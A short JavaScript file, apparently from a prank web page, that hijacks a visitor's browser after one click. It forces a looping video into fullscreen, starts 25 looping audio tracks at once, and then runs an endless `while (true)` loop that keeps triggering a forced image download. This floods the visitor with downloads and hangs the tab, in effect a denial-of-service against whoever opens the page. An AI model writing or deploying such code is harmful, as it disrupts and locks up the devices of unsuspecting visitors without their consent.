let isActive = false;

window.addEventListener('click', () => {
    if (isActive === false) {
        document.body.removeChild(document.querySelector('.click-me'));

        const elem = document.createElement('video');
        elem.classList.add('video');
        elem.src = '/assets/video/superidol.mp4';
        elem.autoplay = true;
        elem.loop = true;
        document.body.appendChild(elem);

        const openFullscreen = () => {
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen();
            }
        }

        const downloadFile = async () => {
            const img = await fetch('/assets/img/super_idol.webp');
            const imgBlob = await img.blob();
            const imgURL = URL.createObjectURL(imgBlob);

            const anchor = document.createElement('a');
            anchor.href = imgURL;
            anchor.download = 'superidol.webp';

            document.body.appendChild(anchor);
            anchor.click();
            document.body.removeChild(anchor);

            URL.revokeObjectURL(imgURL);
        }
    
        isActive = true;

        for (let i = 0; i < 25; i++) {
            const audio = document.createElement('audio');
            audio.classList.add('audio');
            audio.src = '/assets/audio/superidol.mp3';
            audio.autoplay = true;
            audio.loop = true;
            audio.play();
        }

        openFullscreen();
        while (true) {
            downloadFile();
        }
    }
});

// 1500 / 750